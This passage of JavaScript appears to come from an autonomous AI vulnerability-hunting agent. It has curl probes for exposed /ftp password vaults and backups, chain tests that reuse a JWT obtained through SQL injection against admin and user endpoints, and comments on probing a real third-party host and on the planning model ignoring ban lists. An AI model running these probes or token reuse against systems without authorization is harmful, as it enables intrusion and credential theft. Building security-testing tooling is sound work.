    // files in it are directly downloadable. VERIFIED LIVE 19 Oct 2026
    // (solver #125) with safe read-only GETs: /ftp/ listing 200 (reveals
    // filenames), /ftp/incident-support.kdbx 200 / 3246 bytes with KeePass
    // KDBX magic (03d9a29a) — a password vault, no auth required. The
    // null-byte ".bak%00.md" backup trick (#124) is DEAD on this lab
    // version (v17.3.0, container up 46h, unchanged): %00 → 400 Bad Request
    // (Express rejects null bytes in path), direct .bak → 403 "Only .md
    // and .pdf files are allowed!". READ-ONLY probe (listing hrefs +
    // status/size checks, no content exfil); the assessResult pipeline
    // (validators untouched) decides whether it counts as a finding.
    // FIX (19 Oct 2026, solver #126): the probe reported raw observations
    // (filenames + "200 3246b") that the pipeline's signal vocabulary could
    // not see — driver-tested against the REAL assessResult stage logic
    // (real scoreWeirdness/evidenceGate/verifyPipeline imports): the output
    // scored weird=20 and matched none of the triage signal words, so
    // assessResult returned null and the genuine kdbx exposure was invisible
    // to the pipeline. The probe now labels its own observations in plain
    // language — "directory listing" (what the listing IS) and "EXPOSED …
    // WITHOUT authentication (HTTP 200)" (what a 200 on a sensitive file
    // with no auth MEANS, derived from the live status code each run). The
    // label is only printed when code==200 && bytes>0, so a 403 still
    // reports "not exposed" and produces no signal. No validator, gate, or
    // triage regex was changed — only the probe's honest self-description.
    // NOTE (19 Oct 2026, solver #124) — candidate classes deliberately NOT
    // added because their vectors are absent on this lab version (v17.3.0),
    // verified empirically: XXE (the B2B /file-upload path returns 410
    // "deprecated for security reasons"; the echo does not resolve entities),
    // open redirect (/redirect?to= returns 406), password-reset poisoning
    // (/rest/user/security-question returns {} for unregistered emails — no
    // registered test account in scope), SSRF/Gravatar (needs an authed
    // session the driver does not hold), RCE (no grounded vector in this lab).
    // Revisit only if recon discovers new endpoints.
    // NOTE (19 Oct 2026, elite-gap cycle) — detId encodes the probe's PREMISE
    // version, not just its name: solver #125 corrected this probe from the
    // wrong null-byte-.bak premise ('ftp-lfi-backup', already fired and
    // correctly assessed as a true negative) to the verified kdbx-exposure
    // premise. The old detId must NOT be reused, or the once-per-hunt flag
    // silently kills the corrected probe on the current hunt. New premise
    // → new detId ('ftp-kdbx-exposure'); validators untouched.
    // FIX (19 Oct 2026, solver #126): the v1 command (7b979f1) was 650 chars
    // but the driver truncates EVERY probe command to 500 chars
    // (executeWithEvasion String(plan.command).slice(0, 500)) — it died
    // with a dash syntax error and the premise was never actually tested, so
    // the v1 flag was spent on a non-test. v2 keeps the same premise with a
    // compact 468-char command that fits the cap; new command → new detId
    // ('ftp-kdbx-exposure-v2').
    // FIX (20 Oct 2026, parent audit on the first REAL target): the v2
    // probe claimed EXPOSED from status+size alone (200 && bytes>0). On
    // open.ys7.com (Ezviz) EVERY /ftp/* path returns HTTP 200 with the
    // same 43-byte "please log in" JSON — a catch-all — so v2 printed
    // "EXPOSED … (HTTP 200, 43b)" for all six files and the pipeline
    // verified a FALSE finding on a real target (parent-verified false:
    // the body is a login-required message, no listing, no KDBX). A
    // status code is not content. v3 is canary-controlled: it first
    // fetches a file that does not exist (zz-canary-9x7) from the same
    // directory, and prints EXPOSED only when the status is 200 AND
    // the actual body is non-empty AND differs from that not-found
    // control body (status alone manufactured the false positive;
    // body alone is too weak — error pages echo the requested
    // filename, so they differ from the canary trivially; BOTH
    // conditions together are the honest test). On the lab the
    // genuine files (3,246-byte KDBX at 200) pass both, so the
    // genuine class still fires; on a catch-all target every body
    // equals the control → honest "not exposed". New premise → new
    // detId ('ftp-kdbx-exposure-v3') per the premise-version rule;
    // validators untouched. Driver-tested 20 Oct against BOTH targets:
    // Ezviz → all six "not exposed"; lab → KDBX EXPOSED.
    // POSTSCRIPT (21 Oct 2026, Lane A): v3's honest output STILL
    // stamped verified:true on Ezviz at 13:23Z — the verifier derived
    // its 'dir-listing' signal from this probe's own unconditional
    // echo banner (verbatim in the command) and its payload check
    // matched 'exposed' inside the negated verdict lines. The probe
    // was never the remaining bug; the verifier's label trust was.
    // Fixed in assessResult/differential (evidenceSignalIds:
    // non-negated, non-framing signals only) and both Ezviz stamps
    // retracted; v1/v2 detIds are RETIRED_DET_IDS. This probe's
    // premise and command are unchanged.
    if (!plansMention(/\/ftp|lfi|path.?traversal|directory.?list|backup.?file|sensitive.?file|kdbx/i) && !detRun.has('ftp-kdbx-exposure-v3')) {
      detFront.push({
        detId: 'ftp-kdbx-exposure-v3',
        test: 'FTP directory listing + sensitive file exposure',
        command: `{ echo '--- /ftp/ directory listing ---'; curl -sk "${baseUrl}/ftp/"|grep -o 'href="[^"]*"'; C=$(curl -sk "${baseUrl}/ftp/zz-canary-9x7"); for f in incident-support.kdbx eastere.gg encrypt.pyc package.json.bak coupons_2013.md.bak suspicious_errors.yml; do S=$(curl -sk -o /tmp/dmfb -w "%{http_code}" "${baseUrl}/ftp/$f"); B=$(cat /tmp/dmfb); if [ "$S" = 200 ] && [ -n "$B" ] && [ "$B" != "$C" ]; then echo "EXPOSED: $f WITHOUT authentication (real content, differs from not-found control)"; else echo "not exposed: $f"; fi; done; }`,
        why: 'Some apps expose an unauthenticated /ftp directory listing with sensitive files (password vaults, backups) directly downloadable; canary-controlled: a file counts as exposed only if its body differs from the same directory\u2019s not-found response',
        hypothesis: '/ftp may expose sensitive files (password vaults, backups) readable without authentication',
      });
    }

    if (detFront.length) detFrontProbes = detFront;

    if (diversityTests.length) {
      plans.push(...diversityTests);
      think(huntId, `Mandatory diversity tests injected: ${diversityTests.map((t) => t.test).join(', ')} (model stuck on one vuln class)`);
    }
  } catch { /* diversity tests are best-effort */ }

  // CHAIN PURSUIT TESTS (19 Oct 2026, solver #105): If we have chain context
  // (artifacts from a verified finding), generate tests that USE those
  // artifacts to pursue the chain. This is how XBOW chains vulnerabilities —
  // we don't just think about the chain, we ACT on it.
  try {
    const meta = readHuntMeta(huntId) || {};
    const chainCtx = meta.chainContext;
    if (chainCtx?.artifacts?.jwt && chainCtx.chainPath?.length > 1) {
      const jwt = chainCtx.artifacts.jwt;
      const baseUrl = target.replace(/\/$/, '');
      const eps = (recon.endpoints || []).map((e) => String(e).trim());
      const plansMention = (re) => plans.some((p) => re.test(`${p.test || ''} ${p.command || ''}`));
      const chainTests = [];

      // Pursue priv_esc: use the JWT to access admin-only endpoints.
      // If the JWT is admin, we can try to list users, access admin panels.
      if (!plansMention(/chain.*jwt|admin.*jwt|jwt.*admin/i)) {
        chainTests.push({
          test: 'Chain pursuit: admin JWT privilege check',
          command: `curl -sk "${baseUrl}/rest/user/whoami" -H "Authorization: Bearer ${jwt}" | head -c 2000`,
          why: `Chain ${chainCtx.chainPath.join(' → ')}: we have a JWT from "${chainCtx.fromFinding}", testing what privileges it grants`,
          hypothesis: 'JWT from SQLi may grant admin privileges — testing access level',
        });
      }

      // Pursue IDOR with the JWT: can we access other users' data?
      const usersEp = eps.find((e) => /\/users?\/?$/i.test(e) && /^\/(api|rest)/.test(e));
      if (usersEp && !plansMention(/chain.*idor|jwt.*idor/i)) {
        chainTests.push({
          test: 'Chain pursuit: IDOR with JWT',
          command: `curl -sk "${baseUrl}${usersEp}" -H "Authorization: Bearer ${jwt}" | head -c 2000`,
          why: `Chain ${chainCtx.chainPath.join(' → ')}: using JWT to probe for insecure direct object references`,
          hypothesis: 'Authenticated endpoints may lack object-level authorization',
        });
      }

      if (chainTests.length) {
        // HYPOTHESIS LEDGER (19 Oct 2026, solver #127): chain-pursuit tests
        // are injected AFTER planning, so they bypass the prompt's ban list.
        // Live evidence: in the first iteration after the ledger fired, the
        // model obeyed the ban (proposed nothing dead) but these two chain
        // tests re-injected the just-retired JWT/IDOR premises and failed
        // again ("no assessment"). Skip chain tests whose premise the ledger
        // retired — a retired premise re-executed is a burned iteration.
        // Verified hypotheses are NOT filtered: chains legitimately build on
        // verified findings; only dead premises are blocked.
        const deadKeys = new Set(getHypothesisLedger(huntId, { knownApp: recon.knownApp || null }).dead.map((d) => normalizeHypothesis(d.text)));
        const liveChainTests = chainTests.filter((t) => {
          if (deadKeys.has(normalizeHypothesis(t.hypothesis))) {
            think(huntId, `Chain pursuit SKIPPED (ledger-retired premise): ${t.test}`);
            return false;
          }
          return true;
        });
        if (liveChainTests.length) {
          plans.unshift(...liveChainTests); // FRONT: chain pursuit is high-priority (verified finding artifacts) — must be in slice(0,3) execution window
          think(huntId, `Chain pursuit tests injected: ${liveChainTests.map((t) => t.test).join(', ')} (pursuing ${chainCtx.chainPath.join(' → ')})`);
        }
      }
    }
  } catch { /* chain pursuit is best-effort */ }

  // DETERMINISTIC PROBE EXECUTION GUARANTEE (19 Oct 2026, solver #125):
  // the two hand-verified deterministic probes (SSTI polyglot on search,
  // /ftp LFI backup disclosure) were injected into `plans` but NEVER
  // executed — plans.push() put them at the END while execution only takes
  // slice(0,3), and chain tests unshift to the FRONT and crowd them out
  // (observed live 19 Oct 2026: 2 injection windows, 0 executions; XSS
  // diversity probes historically 0 executions). Suggested tests the model
  // never runs are not a discovery frontier. So these two run exactly once
  // per hunt, at the very FRONT of the execution window (after chain
  // injection, so nothing outranks them). Same assessResult pipeline;
  // validators untouched; probes are safe read-only GETs verified live
  // against the lab container before coding.
  if (detFrontProbes.length) {
    plans.unshift(...detFrontProbes);
    think(huntId, `Deterministic probes forced to front (once per hunt, guaranteed execution): ${detFrontProbes.map((t) => t.test).join(', ')}`);
    try {
      writeHuntMetaCheckpoint(huntId, {
        deterministicProbesRun: [...detRun, ...detFrontProbes.map((t) => t.detId)],
      });
    } catch { /* once-per-hunt record is best-effort */ }
  }

  // VARIANT SWEEP (19 Oct 2026, elite-gap cycle — XBOW playbook item,
  // user-ordered 18:32 IST): after a vuln class is verified on one vector,
  // sweep SIBLING vectors for the same class — the elite move the agent was
  // missing (50 of 52 verified:true were the same SQLi re-proven). One
  // recon-grounded deterministic probe per iteration, front of the execution
  // window, once per hunt per sibling. Same assessResult pipeline;
  // validators untouched.
  try {
    const meta0 = readHuntMeta(huntId) || {};
    let vs = meta0.variantSweep;
    const sweepEvents = readHuntEvents(huntId);
    if (!vs || vs.backfilled !== true) {
      // One-time backfill so findings verified before this shipped still
      // get their sweep.
      const classes = backfillVerifiedClasses(sweepEvents);
      vs = { backfilled: true, classes };
      try { writeHuntMetaCheckpoint(huntId, { variantSweep: vs }); } catch { /* best-effort */ }
    }
    // LATE-CLASS MERGE (19 Oct 2026, solver #131): a class can verify BEFORE
    // its sweep class ships — XXE verified 15:23 UTC while classifyFinding
    // returned null for it, so the one-time backfill above (and the
    // per-verification queue) never queued 'xxe' on live hunts. Merge any
    // newly classifiable verified classes idempotently: cheap regex scan
    // over finding titles, meta write only when something actually changed.
    // Validators and the sweep cadence are untouched.
    try {
      const fresh = backfillVerifiedClasses(sweepEvents);
      const missing = fresh.filter((c) => !(vs.classes || []).includes(c));
      if (missing.length) {
        vs = { ...vs, classes: [...(vs.classes || []), ...missing] };
        writeHuntMetaCheckpoint(huntId, { variantSweep: vs });
        think(huntId, `Variant sweep: late-verified class queued — ${missing.join(', ')} (verified before its sweep class shipped).`);
      }
    } catch { /* sweep queue is best-effort */ }
    const detRun2 = new Set(((readHuntMeta(huntId) || {}).deterministicProbesRun) || []);
    const eps2 = ((recon || {}).endpoints || []).map((e) => String(e).trim());
    const baseUrl2 = target.replace(/\/$/, '');
    const plansMentionSib = (sib) => plans.some((p) => String(p.command || '').includes(sib));
    let sweepProbe = null;
    for (const cls of vs.classes || []) {
      for (const sib of sweepSiblings(cls, eps2)) {
        if (plansMentionSib(sib)) continue; // model is already testing this vector — don't duplicate
        const p = buildSweepProbe(cls, sib, baseUrl2, detRun2);
        if (p) { sweepProbe = p; break; }
      }
      if (sweepProbe) break;
    }
    if (sweepProbe) {
      plans.unshift(sweepProbe); // FRONT: the active discovery frontier outranks everything this iteration
      think(huntId, `Variant sweep (elite move — verified class, NEW vector): ${sweepProbe.test} — front of execution window, once per hunt`);
      try {
        writeHuntMetaCheckpoint(huntId, {
          deterministicProbesRun: [...detRun2, sweepProbe.detId],
        });
      } catch { /* once-per-hunt record is best-effort */ }
    }
  } catch { /* variant sweep is best-effort */ }

  if (!plans.length) {
    // HUMAN-LIKE FALLBACK: The model thinks like a human ("Test: ...", "What if...",
    // "I wonder...") but doesn't always produce JSON. Extract test INTENTIONS from
    // the natural language thinking and construct executable commands.
    // A human assistant would do this: hear the idea, figure out how to test it.
    const extracted = extractTestsFromThinking(reply, recon, target);
    if (extracted.length) {
      think(huntId, `Extracted ${extracted.length} test(s) from natural thinking — executing.`);
      plans = extracted;
    } else {
      think(huntId, 'Model replied but produced no usable plan — skipping to next.');
      return { aiOk: false, best: null, failKind: 'bad_output' };
    }
  }

  // HYPOTHESIS LEDGER ENFORCEMENT (19 Oct 2026, solver #128 — XBOW playbook):
  // the ledger's DEAD set was a HARD ban list that lived only in the planning
  // prompt. Live evidence (h_bench_d69e5746, 14:23–14:35 UTC, first 14 min after
  // the 8a061b4 deploy): the model re-planned ledger-retired premises 7x —
  // "NoSQL injection on login" 4x (retired 14:15:03 after 19 failures, zero
  // verifications) and "SQLi authentication bypass on login" 3x (verified,
  // closed for same-instance re-test) — and the re-verifications kept minting
  // (+5 verified:true in ~4 min). Prompt-level steering is advisory; the 8B
  // demonstrably does not obey a ban list it helped retire. The chain-injector
  // needed the same treatment (8a061b4) — extend the same execution-level gate
  // to model-authored plans: drop any plan whose hypothesis the ledger
  // retired, with a think() audit line. Machine-generated probes (detId:
  // deterministic probes, variant sweep) are EXEMPT — they test premises the
  // ledger never retired, by construction. Verified hypotheses are NOT
  // filtered: same-instance re-tests stay prompt-banned, class variants stay
  // legitimate, and the sweep covers them deterministically. Validators,
  // gates, and assessResult untouched — this only stops dead premises from
  // reaching executeWithEvasion.
  try {
    const deadKeys = new Set(getHypothesisLedger(huntId, { knownApp: recon.knownApp || null }).dead.map((d) => normalizeHypothesis(d.text)));
    // VERIFIED-INSTANCE ENFORCEMENT (19 Oct 2026, elite-gap cycle): the prompt
    // ban does not bind the 8B — "SQLi authentication bypass on login"
    // re-verified 3x in the 14 min AFTER the e5ef526 ledger deployed, and
    // 64 of 71 verified:true were that same bug. Each re-proof burns 1 of 3
    // execution slots per 10–15-min iteration — the exact budget class #3
    // discovery needs. Drop model-authored plans that re-test an
    // already-verified (hypothesis, test) pair, with a think() audit line.
    // detId-exempt (sweep/deterministic probes keep testing class variants
    // on sibling endpoints); chain-pursuit untouched (different test
    // strings); first-time verifications untouched (no pair recorded yet).
    // Validators, gates, and assessResult untouched — PoC re-verification
    // (generatePoC) runs outside the plans pipeline and is unaffected.
    const vPairs = getVerifiedPairs(huntId);
    // DEAD-END REGISTRY (Job 6 stage 4): validator rejections of the same
    // test, counted by code. At RETRY_BUDGET the instance is ruled out —
    // the forced pivot is logged, not suggested.
    const ruledCounts = getRuledOutCounts(huntId);
    // PREMISE-LEVEL DEDUP (31 Oct 2026, audit R-05): the text-keyed filters
    // above are defeated by rewording — the same (vulnClass, sink) premise
    // proposed under a new label never matches deadKeys/ruledCounts. Group
    // dead premises AND validator rejections by normalized semantic premise
    // key (premiseDedup.js): failures across rewordings accumulate toward
    // the same toll. detId probes stay exempt (machine-grounded).
    // Reconsideration: a plan carrying non-empty `newPremiseEvidence` is
    // allowed through a retired premise and logged — the brain's only
    // legitimate path to retry with genuinely new evidence.
    const premiseLedger = getPremiseLedger(huntId, { knownApp: recon.knownApp || null });
    const deadPremiseKeys = new Set(premiseLedger.dead.map((d) => d.key));
    const ruledPremiseCounts = new Map();
    for (const [key, count] of ruledCounts) {
      const pk = premiseKey(extractPremise({ hypothesis: key, test: key }));
      if (pk === UNKNOWN_PREMISE_KEY) continue;
      ruledPremiseCounts.set(pk, (ruledPremiseCounts.get(pk) || 0) + count);
    }
    // Write-once retirement audit rows for newly dead premises (the
    // `retired` flag from getPremiseLedger makes this idempotent across
    // turns — the marker is read before this write within the same turn).
    for (const d of premiseLedger.dead) {
      if (d.retired) continue;
      try {
        recordReasoning(huntId, {
          hypothesis: `premise ${d.key} retired`,
          action: 'hypothesis-retirement',
          why: `premise:${d.key} reason:death-toll(${d.failed} failures across rewordings, 0 verified) evidence:${d.samples.join(' / ').slice(0, 160)}`,
          result: `RETIRED: ${d.key} — forced pivot to a genuinely new premise`,
          learned: `Do not re-test ${d.vulnClass} on ${d.sink} without genuinely new evidence (new technique, changed target state, or new proof). Retry requires the newPremiseEvidence plan field. Variants of this class on OTHER sinks stay legitimate.`,
        });
      } catch { /* audit row is best-effort */ }
    }
    if (deadKeys.size || vPairs.size || ruledCounts.size || deadPremiseKeys.size || ruledPremiseCounts.size) {
      const kept = plans.filter((p) => {
        if (p.detId) return true; // machine-generated deterministic/sweep probe — exempt
        if (deadKeys.has(normalizeHypothesis(p.hypothesis))) {
          think(huntId, `Plan SKIPPED (ledger-retired premise): ${p.test || p.hypothesis || 'unnamed'}`);
          return false;
        }
        const pKey = premiseKey(extractPremise(p));
        if (pKey !== UNKNOWN_PREMISE_KEY && deadPremiseKeys.has(pKey)) {
          const evidence = typeof p.newPremiseEvidence === 'string' && p.newPremiseEvidence.trim();
          if (evidence) {
            think(huntId, `Plan ALLOWED (premise ${pKey} retired, new evidence claimed: ${evidence.slice(0, 90)}): ${p.test || p.hypothesis || 'unnamed'}`);
            return true;
          }
          think(huntId, `Plan SKIPPED (premise retired: ${pKey} — ${premiseLedger.dead.find((d) => d.key === pKey)?.failed || '?'} failures across rewordings, forced pivot): ${p.test || p.hypothesis || 'unnamed'}`);
          return false;
        }
        const ruled = ruledCounts.get(normalizeHypothesis(p.test || p.action || '')) || 0;
        if (ruled >= RETRY_BUDGET) {
          think(huntId, `Plan SKIPPED (dead-end registry: ${ruled} validator rejections — forced pivot): ${p.test || p.hypothesis || 'unnamed'}`);
          return false;
        }
        const ruledP = pKey !== UNKNOWN_PREMISE_KEY ? (ruledPremiseCounts.get(pKey) || 0) : 0;
        if (ruledP >= RETRY_BUDGET) {
          think(huntId, `Plan SKIPPED (dead-end registry, premise-level: ${ruledP} validator rejections across rewordings — forced pivot): ${p.test || p.hypothesis || 'unnamed'}`);
          return false;
        }
        const pair = normalizeHypothesis(p.hypothesis) + '||' + normalizeHypothesis(p.test || p.action || '');
        if (vPairs.has(pair)) {
          think(huntId, `Plan SKIPPED (ledger-verified same-instance re-test): ${p.test || p.hypothesis || 'unnamed'}`);
          return false;
        }
        return true;
      });
      plans = kept;
    }
  } catch { /* ledger enforcement is best-effort — never break the hunt */ }

  // WRONG-TARGET PLAN FILTER (zero-genuine lane): drop model plans
  // whose test/command names another app's endpoints for this
  // target's known app — executing them burns a slot on a 404 and,
  // worse, their failures feed the ledger and retire premises that
  // were never tested on the real target. Deterministic/sweep probes
  // (detId) are exempt: they are machine-grounded in recon.
  try {
    const knownApp = recon.knownApp || null;
    if (knownApp && plans.length) {
      const kept = plans.filter((p) => {
        if (p.detId) return true;
        const bad = findWrongTargetPaths(knownApp, `${p.test || ''} ${p.command || ''} ${p.hypothesis || ''}`);
        if (bad.length) {
          think(huntId, `Plan SKIPPED (wrong-target endpoint for ${knownApp}: ${bad.join(', ')}): ${p.test || p.hypothesis || 'unnamed'}`);
          return false;
        }
        return true;
      });
      plans = kept;
    }
  } catch { /* wrong-target filter is best-effort — never break the hunt */ }

  // Execute up to 3 hypotheses (multi-hypothesis > single guess)
  let best = null;
  // PARALLEL EXECUTION: run all tests concurrently like a human would.
  // A human fires multiple probes at once, not one-by-one.
  // Execute up to 3 hypotheses (multi-hypothesis > single guess).
  // The model is asked for THREE plans; take up to 3 with commands.
  const testPromises = plans.slice(0, 3).filter((plan) => plan.command).map(async (plan) => {
    think(huntId, `Test: ${plan.test || 'unnamed'} — ${plan.why || ''}`);
    // TRANSPORT CAP (solver #459): was slice(0, 500), which cut legitimate
    // commands mid-string (a 650-char probe died on a dash syntax error,
    // #126). 4000 chars is a sanity bound for a single shell line, NOT a
    // validator; anything longer belongs in a file artifact executed by
    // path (WRITE_ARTIFACT / RUN_ARTIFACT), which is unbounded.
    const result = await executeWithEvasion(huntId, target, String(plan.command).slice(0, 4000));
    const rec = await assessResult(huntId, target, plan, result);
    // PLAN TREE (Job 6 stage 6): code records the validator outcome on
    // the leaf — verified closes it, failures count toward the park
    // threshold and the phase's re-plan trigger.
    try {
      recordPlanOutcome(huntId, plan.test || plan.hypothesis || '', rec ? (rec.verified ? 'verified' : 'rejected') : 'no-assessment');
    } catch { /* plan tree is best-effort */ }
    // Memory: record WHY this was tried and what was learned, so the agent
    // learns from its own reasoning across iterations (read back via
    // formatReasoningForPrompt in the planning prompt).
    try {
      recordReasoning(huntId, {
        hypothesis: plan.hypothesis || '',
        action: plan.test || 'unnamed',
        why: plan.why || '',
        result: rec ? (rec.verified ? 'VERIFIED: ' + (rec.title || rec.class || '') : 'not verified') : 'no assessment',
        learned: rec && rec.verified ? 'This attack works here — explore variants.' : 'This probe did not confirm a vulnerability here.',
        followUp: plan.hypothesis ? 'Consider variants of: ' + plan.hypothesis : '',
      });
    } catch { /* memory is best-effort, never break the hunt */ }
    // GLOBAL MEMORY (19 Oct 2026): record genuine technique failures so
    // future hunts deprioritise what consistently fails. Only clean
    // executions count — a malformed command (DNS failure, syntax error)
    // or an empty response teaches nothing about the technique itself,
    // and unidentifiable probes ('other') would pollute the counters.
    try {
      const rawOut = String((result && result.stdout) || '') + '\n' + String((result && result.stderr) || '');
      const malformed = /name or service not known|command not found|syntax error|no such file|invalid option|could not resolve/i.test(rawOut);
      const tech = inferTechnique(`${plan.test || ''} ${plan.hypothesis || ''}`);
      if (!malformed && rawOut.length > 50 && tech !== 'other' && rec && !rec.verified) {
        const gm0 = readHuntMeta(huntId) || {};
        const fp0 = gm0.appFingerprint || { appType: 'unknown', techStack: [] };
        recordGlobalLearning({
          type: 'technique',
          technique: tech,
          target: String(target).slice(0, 120),
          appType: fp0.appType || 'unknown',
          techStack: fp0.techStack || [],
          success: false,
          payload: String(plan.command || '').slice(0, 200),
          context: plan.test || 'unnamed probe',
          note: 'Technique executed cleanly but did not verify.',
        });
      }
      // PROBE QUALITY (19 Oct 2026, solver #121): malformed executions are a
      // SEPARATE failure signal from technique failures. A DNS failure teaches
      // nothing about whether the technique works against the app — but "your
      // last N probes never reached the target" is a lesson the model must see
      // compound. Kept apart (type 'probe-quality', own dedup key) so genuine
      // technique success rates stay clean. This is the dominant failure mode
      // for business-logic probes (fake domains, bare hostnames); the static
      // seed note was ignored, a compounding counter is harder to ignore.
      if (malformed && tech !== 'other') {
        const gm0q = readHuntMeta(huntId) || {};
        const fp0q = gm0q.appFingerprint || { appType: 'unknown', techStack: [] };
        recordGlobalLearning({
          type: 'probe-quality',
          technique: tech,
          target: String(target).slice(0, 120),
          appType: fp0q.appType || 'unknown',
          techStack: fp0q.techStack || [],
          success: false,
          payload: String(plan.command || '').slice(0, 200),
          context: plan.test || 'unnamed probe',
          note: 'Malformed probe — DNS failure, syntax error, or fake domain. The command never reached the target; this says nothing about the technique, only about command construction. Ground every URL to recon-discovered endpoints.',
        });
      }
    } catch { /* global memory is best-effort, never break the hunt */ }
    return rec;
  });
  const results = await Promise.all(testPromises);
  for (const rec of results) {
    if (rec && rec.verified && !best) best = rec;
  }
  return { aiOk: true, best };
}
